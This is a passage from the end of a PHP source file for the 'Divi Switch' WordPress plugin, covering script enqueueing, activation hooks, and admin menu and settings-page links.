		return $saveResult;
}
/* /dsx-exclude */


private static function editHtaccess($toggle=true) {
		/** Implementation of this function was removed per ETM request; if it is needed again in future, please see Git history. **/
}
	
public static function enqueueScripts() {
		wp_enqueue_script('DiviSwitch',
			self::$pluginUrl.'includes/output/script.js',
			array('jquery'),
/* dsx-exclude */
			filemtime(__DIR__.'/includes/output/script.js')
/* /dsx-exclude */
/* dsx-execute
			echo(time());
/dsx-execute */
		);
}
	
public static function enqueueScriptsAdmin() {
		wp_enqueue_style('DiviSwitchAdmin',
			self::$pluginUrl.'css/admin.css',
			array(),
			self::PLUGIN_VERSION
		);
}
	
public static function onActivate() {
		self::editHtaccess();
}
	
public static function onDeactivate() {
		self::editHtaccess(false);
	}
	
	public static function isActivated() {
		return self::$isActivated;
	}
	
/* dsx-exclude */
	
// Following code copied from WP and Divi Icons Pro by Aspen Grove Studios (GPLv2), adapted
	
public static function adminMenu() {
		/*add_submenu_page('admin.php', self::PLUGIN_NAME, self::PLUGIN_NAME,
							'install_plugins', 'ds-icon-expansion', array('AGS_Divi_Icons', 'adminPage'));*/
		add_submenu_page('et_divi_options', self::PLUGIN_NAME, self::PLUGIN_NAME,
							'install_plugins', 'admin.php?page=et_divi_options#wrap-swtch_tab');
		/*add_submenu_page('et_extra_options', self::PLUGIN_NAME, self::PLUGIN_NAME,
							'install_plugins', 'ds-icon-expansion', array('AGS_Divi_Icons', 'adminPage'));*/
		
		// If already on the Divi Theme Options page, make sure that clicking the Divi Switch link changes the tab
		$slug = is_plugin_active( 'divi-ghoster/divi-ghoster.php' ) ? DiviGhoster::$settings['theme_slug'] : '';

		// phpcs:ignore WordPress.Security.NonceVerification.Recommended
		if (isset($_GET['page']) && ($_GET['page'] == 'et_divi_options' || $_GET['page'] == 'et_' .$slug . '_options')) {
			add_action('admin_footer', function() {
				?><script>jQuery('#adminmenu a[href$=\'#wrap-swtch_tab\']').click(function() {jQuery('.ui-tabs-anchor[href="#wrap-swtch_tab"]:first').click();});</script><?php
			});
		}
}

	// Add settings link on plugin page
public static function pluginActionLinks($links) {
	// get slug from Ghoster if active
 	if  (class_exists( 'DiviGhoster' )){ 
		$diviGhosterOptions = get_option( 'agsdg_settings' );
		$diviThemeSlug= $diviGhosterOptions['theme_slug'];		
	} else {
		$diviThemeSlug='divi';
	}

	array_unshift($links, '<a href="admin.php?page=et_'.$diviThemeSlug.'_options#wrap-swtch_tab">'.esc_html__('Go to Divi Switch', 'divi-switch').'</a>');
	return $links;
}

public static function onLoadPluginsPhp() {
		$plugin = plugin_basename(__FILE__); 
		add_filter('plugin_action_links_'.$plugin, array('DiviSwitch', 'pluginActionLinks'));
}
	
// End code from WP and Divi Icons Pro
	
/* /dsx-exclude */
	
} // end class

DiviSwitch::setup();
register_activation_hook(__FILE__, array('DiviSwitch', 'onActivate'));
register_deactivation_hook(__FILE__, array('DiviSwitch', 'onDeactivate'));

} // end if template is Divi
